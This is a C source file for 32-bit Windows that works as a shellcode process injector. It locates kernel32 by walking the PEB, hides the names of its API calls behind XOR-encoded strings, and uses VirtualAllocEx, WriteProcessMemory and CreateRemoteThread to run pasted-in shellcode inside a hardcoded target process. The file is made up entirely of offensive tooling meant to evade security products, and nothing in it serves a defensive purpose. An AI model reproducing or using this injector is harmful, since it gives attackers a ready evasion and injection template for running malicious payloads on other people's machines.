#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>


typedef struct _UNICODE_STRING {USHORT Length;USHORT MaximumLength;PWSTR  Buffer;} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID      SectionPointer;
    ULONG      CheckSum;
    ULONG      TimeDateStamp;
    PVOID      LoadedImports;
    PVOID      EntryPointActivationContext;
    PVOID      PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {ULONG Length; BOOLEAN Initialized; HANDLE SsHandle;LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList;LIST_ENTRY InInitializationOrderModuleList;} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions;  BOOLEAN BeingDebugged; BOOLEAN SpareBool; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr;} PEB, * PPEB;
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef LPVOID (WINAPI* VAExType)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL(WINAPI* WPMType)( HANDLE  hProcess,LPVOID  lpBaseAddress, LPCVOID lpBuffer,SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten );
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags, DWORD lpThreadId);

void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}
LPCSTR DAndP(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
    char* decoded = new char[len + 1];
    memcpy(decoded, encoded, len);
    XOR(reinterpret_cast<unsigned char*>(decoded), len, key, key_len);
    decoded[len] = '\0'; 
    return decoded;
    delete[] decoded;
}

PVOID GetProcAddressKernel32(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
        if (strcmp(functionName, lpProcName) == 0) {
            return (PVOID)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

int main() {

    // code - 32 bit
    unsigned char code[] = {"Paste you shellcode here"};
    unsigned int p_len = sizeof(code);
    const char* key = "offensivepanda";
    size_t k_len = strlen(key);

    PEB* peb;
    PLDR_DATA_TABLE_ENTRY module;
    LIST_ENTRY* lEntry;
    HMODULE k32baseAddr = NULL;
    GETPROCADDRESS ptrGetProcAddress = NULL;
    LOADLIBRARYA ptrLoadLibraryA = NULL;
    VAExType pVAEx;
    WPMType pWPM;
    CRTType pCRT;

    
    __asm {
        mov eax, fs: [0x30]
        mov peb, eax
    }


    lEntry = peb->Ldr->InLoadOrderModuleList.Flink;
    do {
        module = CONTAINING_RECORD(lEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        char baseDllName[256];
        int i;
        for (i = 0; i < module->BaseDllName.Length / sizeof(WCHAR) && i < sizeof(baseDllName) - 1; i++) {
            baseDllName[i] = (char)module->BaseDllName.Buffer[i];
        }
        baseDllName[i] = '\0';

        if (_stricmp(baseDllName, "kernel32.dll") == 0) {
            k32baseAddr = (HMODULE)module->DllBase;
        }

        lEntry = lEntry->Flink;
    } while (lEntry != &peb->Ldr->InLoadOrderModuleList);

    if (k32baseAddr) {
        int pid = 0;
        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
        pid = 45488;	
        if (pid) {
            printf("Process ID = %d \n", pid);
            //try to open target process
            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE, pid);

            if (hProcess != NULL) {
                unsigned char sGPA[] = { 0x28, 0x03, 0x12, 0x35, 0x1c, 0x1c, 0x0a, 0x37, 0x01, 0x14, 0x13, 0x0b, 0x17, 0x12 };
                unsigned char sLLA[] = { 0x23, 0x09, 0x07, 0x01, 0x22, 0x1a, 0x0b, 0x04, 0x04, 0x02, 0x18, 0x2f };
                LPCSTR Z = DAndP(sGPA, sizeof(sGPA), key, k_len);
                LPCSTR X = DAndP(sLLA, sizeof(sLLA), key, k_len);
                ptrGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(k32baseAddr, Z);
                ptrLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(k32baseAddr, X);
                HMODULE kernel32Base = ptrLoadLibraryA("kernel32.dll");
                unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
                unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
                unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
                LPCSTR A = DAndP(sVAEx, sizeof(sVAEx), key, k_len);
                LPCSTR B = DAndP(sWPM, sizeof(sWPM), key, k_len);
                LPCSTR C = DAndP(sCRT, sizeof(sCRT), key, k_len);
                pVAEx = (VAExType)ptrGetProcAddress(kernel32Base, (LPCSTR)A);
                pRemoteCode = pVAEx(hProcess, NULL, p_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                pWPM = (WPMType)ptrGetProcAddress(kernel32Base, (LPCSTR)B);
                pWPM(hProcess, pRemoteCode, (PVOID)code, (SIZE_T)p_len, (SIZE_T*)NULL);
                pCRT = (CRTType)ptrGetProcAddress(kernel32Base, (LPCSTR)C);
                hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);

                if (hThread != NULL) {
                    WaitForSingleObject(hThread, 500);
                    CloseHandle(hThread);
                    return 0;
                }

                return -1;
                CloseHandle(hProcess);
            }

        }
    }
    return 0;
}